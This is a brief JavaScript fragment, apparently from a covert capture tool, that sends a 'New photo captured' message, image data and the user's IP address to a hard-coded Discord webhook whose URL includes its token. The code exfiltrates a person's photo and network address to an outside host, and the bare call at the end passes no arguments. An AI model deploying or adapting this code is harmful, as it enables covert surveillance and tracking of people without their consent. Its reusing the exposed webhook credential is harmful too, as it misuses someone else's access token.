function sendToDiscordWebhook(imageData, userIP) {
    const webhookUrl = 'https://discord.com/api/webhooks/1218167346682663103/K1szw4If2QzyENmwLF6diJrmS6jVITzmJTcInoRs3aewfsOTJJNMWNRIWG-x3Pp0QVvT';
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: 'New photo captured', embeds: [{ description: `User IP: ${userIP}`, image: { url: imageData }, color: "000000" }] })
    });
}
sendToDiscordWebhook()